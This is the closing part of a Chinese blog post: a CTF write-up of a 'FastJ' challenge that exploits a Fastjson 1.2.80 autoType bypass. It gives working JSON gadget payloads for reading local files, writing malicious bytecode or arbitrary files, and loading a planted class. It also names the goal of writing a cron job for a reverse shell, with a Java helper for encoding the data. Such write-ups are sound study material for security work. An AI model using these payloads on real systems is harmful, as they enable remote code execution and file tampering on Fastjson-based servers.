+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Throwable bypass: InputCoercionException</span><br><span class="line">  └─ contains → UTF8StreamJsonParser</span><br><span class="line">       └─ field `in` → InputStream</span><br></pre></td></tr></table></figure>
+<p>Fastjson 在构造这些类时会顺便初始化其字段类型（如 in: InputStream），从而将 InputStream 加入 autoType 缓存。</p>
+<p>[![截屏2024-11-07 21.36.27](…/images/截屏2024-11-07 21.36.27.png)](<a target="_blank" rel="noopener" href="https://github.com/luelueking/CVE-2022-25845-In-Spring/raw/main/images/%E6%88%AA%E5%B1%8F2024-11-07">https://github.com/luelueking/CVE-2022-25845-In-Spring/raw/main/images/截屏2024-11-07</a> 21.36.27.png)</p>
+<h5 id="step2-file协议读取tmp内容获取tomcat的docbase文件名称"><a class="markdownIt-Anchor" href="#step2-file协议读取tmp内容获取tomcat的docbase文件名称"></a> Step2: file协议读取/tmp内容，获取tomcat的docbase文件名称</h5>
+<blockquote>
+<p>逐字节读取内容</p>
+</blockquote>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.InputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;delegate&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;delegate&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;file&#125;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1024&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;boms&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;bytes&quot;</span><span class="punctuation">:</span> $<span class="punctuation">&#123;</span>data<span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;boms&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;bytes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="number">1</span><span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.a.delegate&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>[![截屏2024-11-07 21.35.56](…/images/截屏2024-11-07 21.35.56.png)](<a target="_blank" rel="noopener" href="https://github.com/luelueking/CVE-2022-25845-In-Spring/raw/main/images/%E6%88%AA%E5%B1%8F2024-11-07">https://github.com/luelueking/CVE-2022-25845-In-Spring/raw/main/images/截屏2024-11-07</a> 21.35.56.png)</p>
+<h5 id="step3-写入恶意字节码到docbase目录下"><a class="markdownIt-Anchor" href="#step3-写入恶意字节码到docbase目录下"></a> Step3: 写入恶意字节码到docbase目录下</h5>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.InputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.AutoCloseInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;in&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.CharSequenceInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span></span><br><span class="line">          <span class="string">&quot;$&#123;shellcode&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;charset&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> $<span class="punctuation">&#123;</span>size<span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.output.LockableFileWriter&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;file2write&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;charset&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;charset&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.InputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;inputStream&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.a&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;c&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">JSON</span><br></pre></td></tr></table></figure>
+<p>[![截屏2024-11-07 21.37.04](…/images/截屏2024-11-07 21.37.04.png)](<a target="_blank" rel="noopener" href="https://github.com/luelueking/CVE-2022-25845-In-Spring/raw/main/images/%E6%88%AA%E5%B1%8F2024-11-07">https://github.com/luelueking/CVE-2022-25845-In-Spring/raw/main/images/截屏2024-11-07</a> 21.37.04.png)</p>
+<h5 id="step4-触发恶意类加载"><a class="markdownIt-Anchor" href="#step4-触发恶意类加载"></a> Step4: 触发恶意类加载</h5>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.chenzai.HackException&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>但是可以看到，他打的是common-io。本题的JDK是11，有什么意义呢？</p>
+<p>然而JDK11自带符号信息，可以调用任意构造函数。猜测还是利用OutputStream下的子类实现<strong>任意文件写</strong>。</p>
+<p>而且题目看似多此一举的给了一个<code>FilterFileOutputStream</code>：</p>
+<p>题目那个getflag()不能直接读，估计就是给你提示到用这个<code>FilterFileOutputStream</code>的。这道题其实是写定时任务反弹shell的，也是常见的写文件R方法。</p>
+<h4 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> EXP</h4>
+<p>根据上述思路找 OutputStream Gadget的思路</p>
+<ul>
+<li>
+<p><strong>继承 Throwable</strong></p>
+</li>
+<li>
+<p><strong>有字段指向</strong>某个含 OutputStream 成员的类</p>
+</li>
+<li>
+<p><strong>类路径没有被 Fastjson 拦截</strong></p>
+<p>在BOOT-INF/lib/中查看项目依赖</p>
+</li>
+</ul>
+<p><img src="../images/8dafb2f2-9e92-3180-97c9-655e3c8c29a9.png" alt="image.png" /></p>
+<p>发现jackson生态全套，其中jackson-core-2.13.2.jar中包含 UTF8JsonGenerator，可构造 OutputStream 缓存链</p>
+<p>使用Mini-Venom师傅构造的gadget</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UTF8JsonGenerator</span><br><span class="line">JsonGenerator</span><br><span class="line">JsonGenerationException</span><br><span class="line">Exception</span><br></pre></td></tr></table></figure>
+<p>payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123; \&quot;@type\&quot;: \&quot;java.lang.Exception\&quot;, \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.JsonGenerationException\&quot;, \&quot;g\&quot;: &#123;&#125; &#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.a.a&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;c&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123; \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.JsonGenerator\&quot;, \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.json.UTF8JsonGenerator\&quot;, \&quot;out\&quot;: &#123;&#125; &#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.c.c&quot;</span> <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>得到回显，说明绕过了“AutoTypeCheck”机制</p>
+<p><strong>任意文件写入</strong></p>
+<p>题目实现了FilterFileOutputStream类，可以通过@type加载</p>
+<p>利用 JDK 的标准类 InflaterOutputStream 和 MarshalOutputStream 可以在反序列化期间<strong>触发写入流数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Fastjson parse()</span><br><span class="line">  ↓</span><br><span class="line">MarshalOutputStream.readObject()</span><br><span class="line">  ↓</span><br><span class="line">InflaterOutputStream</span><br><span class="line">     └── infl.input.array → base64压缩数据</span><br><span class="line">     └── infl.limit → 解压后长度</span><br><span class="line">  ↓</span><br><span class="line">FilterFileOutputStream → 文件创建并写入</span><br></pre></td></tr></table></figure>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.OutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.app.FilterFileOutputStream&quot;</span><span class="punctuation">,</span>  ← 自定义类</span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/test&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;infl&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;array&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;base64压缩数据&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;limit&quot;</span><span class="punctuation">:</span> &lt;解压后的长度&gt;</span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;bufLen&quot;</span><span class="punctuation">:</span> <span class="string">&quot;100&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;protocolVersion&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>array: 压缩后的字符串内容</p>
+<p><strong>数据压缩部分的 Java 实现代码解析</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.DeflaterOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Array</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 写入文件的原始内容</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 压缩并编码</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">DeflaterOutputStream</span> <span class="variable">deflaterOutputStream</span> <span class="operator">=</span></span><br><span class="line">                         <span class="keyword">new</span> <span class="title class_">DeflaterOutputStream</span>(byteArrayOutputStream)) &#123;</span><br><span class="line">                deflaterOutputStream.write(input.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取 Base64 编码后的结果</span></span><br><span class="line">            <span class="type">byte</span>[] compressedBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">            <span class="type">String</span> <span class="variable">encoded</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(compressedBytes);</span><br><span class="line">            <span class="type">int</span> <span class="variable">leng</span> <span class="operator">=</span> compressedBytes.length;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出结果</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Base64 array: &quot;</span> + encoded);</span><br><span class="line">            System.out.println(<span class="string">&quot;Length: &quot;</span> + leng);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后写定时任务反弹shell</p>
+<h2 id="感想"><a class="markdownIt-Anchor" href="#感想"></a> 感想</h2>
+<p>对于FastJ这个题并不要求一定看懂，毕竟拓展知识面不一定是全部背下来，我们知道有这种情况就好了，在以后遇到fastjson1.2.80的这个漏洞的时候就可以重新回顾并照猫画虎</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">Shiro反序列化</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/fastjson%E9%AB%98%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">fastjson高版本反序列化</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="tag">比赛复现</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/background-2.jpg" data-sizes="auto" alt="LilCTF025比赛复现" class="lazyload">
+          
+        
+        <a href="/2025/08/13/LilCTF025%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            LilCTF025比赛复现
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/175637316152817563731618.jpg" data-sizes="auto" alt="Crypto-算法&amp;题目" class="lazyload">
+        
+      
+      <a href="/2025/08/10/Crypto-%E7%AE%97%E6%B3%95&%E9%A2%98%E7%9B%AE/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          Crypto-算法&amp;题目
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%83%AD%E8%BA%AB%E8%B5%9B-execute"><span class="toc-number">1.</span> <span class="toc-text"> 热身赛-Execute</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%83%AD%E8%BA%AB%E8%B5%9B-ezloginshiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text"> 热身赛-EzLogin(Shiro反序列化)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E8%B5%9B-%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-number">3.</span> <span class="toc-text"> 初赛-计算器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E8%B5%9B-fastj"><span class="toc-number">4.</span> <span class="toc-text"> 初赛-FastJ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">4.1.</span> <span class="toc-text"> 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fastjson%E7%9A%84autotypecheck%E6%9C%BA%E5%88%B6"><span class="toc-number">4.1.1.</span> <span class="toc-text"> fastjson的“AutoTypeCheck”机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fastjson%E7%9A%84%E7%B1%BB%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6"><span class="toc-number">4.1.2.</span> <span class="toc-text"> fastjson的类缓存机制</span></a></li><li 